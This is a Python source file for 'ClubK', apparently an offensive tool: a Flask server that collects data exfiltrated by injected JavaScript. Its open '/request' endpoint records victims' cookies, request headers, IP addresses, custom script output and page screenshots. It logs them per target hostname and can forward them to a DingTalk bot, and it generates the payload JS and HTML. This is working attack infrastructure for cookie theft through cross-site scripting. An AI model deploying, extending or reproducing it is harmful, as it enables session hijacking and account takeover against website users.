# -*- coding: UTF-8 -*-
# @Project ：ClubK
# @File    ：ClubK.py
# Author   ：0xsdeo
# Date     ：2024/9/27 23:16
import io
import os
import time
import json
import base64
import argparse
from flask import *
from flask_cors import CORS
from PIL import Image, UnidentifiedImageError

from config import pem, key, generate_js, generate_html
from dingtalk_bot import bot


async def custom_js(data, ip: str, header: str, host):
    global ding

    get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    delhttp = host.index("/") + 2
    hostname = host[delhttp:]
    if hostname.find(":") != -1:
        delport = hostname.find(":")
    else:
        delport = len(hostname)
    hostname = hostname[:delport]

    if ding:
        bot(get_time + '\n' + 'HOST：' + host + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')

    header = header.replace("\n", "")

    if os.path.isdir(f"{os.getcwd()}/cookies"):
        with open(f"cookies/{hostname}.txt", "a", encoding="utf-8") as f:
            f.write(
                get_time + '\n' + 'HOST：' + host + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')
    else:
        os.mkdir(f"{os.getcwd()}/cookies")
        with open(f"cookies/{hostname}.txt", "a", encoding="utf-8") as f:
            f.write(
                get_time + '\n' + 'HOST：' + host + '\nip：' + ip + '\n' + 'data：' + data + '\n\n' + 'Headers：\n' + header + '\n')


async def save_data(data: dict, ip: str, header: str):
    global ding
    global screen

    try:
        if not screen:
            screenshot_state = ""
        elif "image" in data:
            comma_index = data['image'].index(',')
            image_data = base64.b64decode(data['image'][comma_index + 1:])
            image = Image.open(io.BytesIO(image_data))

            save_png_time = str(round(time.time()))

            image_path = f"cookies/{data['hostname']}/{save_png_time}.jpg"

            if os.path.isdir(f"cookies/{data['hostname']}"):
                image.save(image_path)
            else:
                os.makedirs(f"cookies/{data['hostname']}")
                image.save(image_path)

            screenshot_state = f"\n截图已保存在/{image_path}"
        else:
            screenshot_state = "\n客户端截图失败"
    except UnidentifiedImageError:
        screenshot_state = f"\n客户端截图失败，截图返回内容为{data['image']}，这可能是由于该请求并未渲染在页面上而导致的截图失败。"
    except ValueError:
        screenshot_state = "\n客户端截图失败"
    except:
        screenshot_state = "\n本地保存图片失败"

    get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

    if ding:
        bot(get_time + '\n' + 'HOST：' + data['host'] + '\nip：' + ip + '\nCookie: ' + data[
            'cookie'] + screenshot_state + '\n\n' + 'Headers：\n' + header + '\n')

    header = header.replace("\n", "")

    if os.path.isdir(f"{os.getcwd()}/cookies"):
        with open(f"cookies/{data['hostname']}.txt", "a", encoding="utf-8") as f:
            f.write(get_time + '\n' + 'HOST：' + data['host'] + '\nip：' + ip + '\nCookie: ' + data[
                'cookie'] + screenshot_state + '\n\n' + 'Headers：\n' + header + '\n')
    else:
        os.mkdir(f"{os.getcwd()}/cookies")
        with open(f"cookies/{data['hostname']}.txt", "a", encoding="utf-8") as f:
            f.write(get_time + '\n' + 'HOST：' + data['host'] + '\nip：' + ip + '\nCookie: ' + data[
                'cookie'] + screenshot_state + '\n\n' + 'Headers：\n' + header + '\n')


app = Flask(__name__)
CORS(app, resources=r'/*')


@app.route('/request', methods=['POST'])
async def get_cookie():
    request_ip = request.remote_addr
    if js:
        host = dict(request.headers)['Origin']
        await custom_js(request.get_data().decode(), request_ip, str(request.headers), host)
        return "success"
    data = json.loads(request.get_data().decode())
    await save_data(data, request_ip, str(request.headers))
    return "success"


@app.route('/')
def index():
    return render_template('index.html')


if __name__ == "__main__":
    print(r""" _____   _           ___   _____   _   _   
/  ___| | |         /   | |  _  \ | | / /  
| |     | |        / /| | | |_| | | |/ /   
| |     | |       / / | | |  _  { | |\ \   
| |___  | |___   / /  | | | |_| | | | \ \  
\_____| |_____| /_/   |_| |_____/ |_|  \_\ """)

    arg = argparse.ArgumentParser()
    arg.add_argument('-s', '--ssl', action="store_true", help="启用https，可选项")
    arg.add_argument('-d', '--ding', action="store_true", help="启用钉钉机器人，可选项")
    arg.add_argument('--js', default=False, help="自定义JS，指定JS文件名即可，可选项")
    arg.add_argument('--screen', action="store_true", help="启用页面截图，可选项")
    arg = arg.parse_args()

    ding = arg.ding
    screen = arg.screen
    js = arg.js

    generate_js(screen) if screen else generate_js()
    generate_html(js) if js else generate_html()

    if arg.screen and arg.js:
        raise ValueError("不支持自定义JS进行截图")

    if arg.ssl:
        ssl = (pem, key)
        app.run("0.0.0.0", port=5000, ssl_context=ssl)
    else:
        app.run("0.0.0.0", port=5000)
